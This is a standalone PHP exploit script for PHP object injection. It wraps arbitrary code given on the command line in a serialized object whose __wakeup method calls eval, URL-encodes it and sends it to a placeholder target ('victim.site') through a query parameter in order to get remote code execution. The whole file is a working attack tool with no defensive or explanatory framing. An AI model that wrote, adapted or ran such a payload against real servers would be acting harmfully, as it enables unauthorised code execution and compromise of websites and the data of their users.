<?php

// Check if a command-line argument is provided
if (isset($argv[1])) {
    // Use the provided PHP code as the user input
    $userCode = $argv[1];
} else {
    // If no command-line argument is provided, prompt the user for input
    echo "Usage: php script.php 'PHP code'\n";
    exit(1);
}

// PHP code for serializing the object
$phpCode = <<<PHP
class PHPObjectInjection {
    public \$inject;

    function __construct() {}

    function __wakeup() {
        if (isset(\$this->inject)) {
            eval(\$this->inject);
        }
    }
}

// Create a payload
\$payload = new PHPObjectInjection();
\$payload->inject = "{$userCode}";

// Serialize the payload
\$serializedPayload = serialize(\$payload);

// URL encode the serialized payload for inclusion in a URL
\$encodedPayload = urlencode(\$serializedPayload);

echo "Serialized Payload: " . \$encodedPayload . PHP_EOL;
PHP;

// Print the serialized object
eval($phpCode);

// URL of the target endpoint
$targetUrl = "http://victim.site/";

// Construct the URL with the serialized payload
$urlWithPayload = $targetUrl . "?r=" . $encodedPayload;

// Send the GET request
$response = file_get_contents($urlWithPayload);

// Print the response
echo $response;
?>
